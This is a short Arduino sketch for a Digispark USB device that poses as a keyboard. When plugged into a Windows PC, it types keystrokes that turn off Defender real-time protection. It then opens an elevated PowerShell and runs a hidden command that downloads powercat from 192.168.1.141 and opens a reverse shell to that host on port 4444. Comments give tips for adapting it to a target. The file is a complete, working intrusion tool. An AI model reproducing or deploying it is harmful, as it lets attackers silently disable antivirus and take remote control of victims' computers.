#include "DigiKeyboard.h"

#define KEY_ESC     41 
#define KEY_TAB     43
#define KEY_SPACE   44

void setup() {
  pinMode(1, OUTPUT);
  digitalWrite(1, LOW);
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  
  disarm_defender();
  create_reverse_shell();
  
  while (true){
      digitalWrite(1, HIGH);
      delay(300);
      digitalWrite(1, LOW);
      delay(300);
  }
}

void disarm_defender() {
   // open the windows search
  DigiKeyboard.sendKeyStroke(KEY_ESC, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(700);

  // open windows security settings (change it for the word 'security' in your language)
  DigiKeyboard.print(F("seguridad"));
  DigiKeyboard.delay(700);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // disable real-time protection
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // exit windows security settings
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  }

void create_reverse_shell (){
    //open powershell prompt with admin rights
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(1000);
    DigiKeyboard.print(F("powershell"));
    DigiKeyboard.delay(700);
    DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT|MOD_SHIFT_LEFT);
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1500);
    // change the IP or if you are sure the target has internet connection put here powercat's release file, that way you wont need the http server
    DigiKeyboard.print("PowerShell.exe -WindowStyle hidden {powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.141/powercat.ps1');powercat -c 192.168.1.141 -p 4444 -e powershell\"}");
    // hides the shell from the user and it gives us access from the remote computer
    DigiKeyboard.delay(700);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
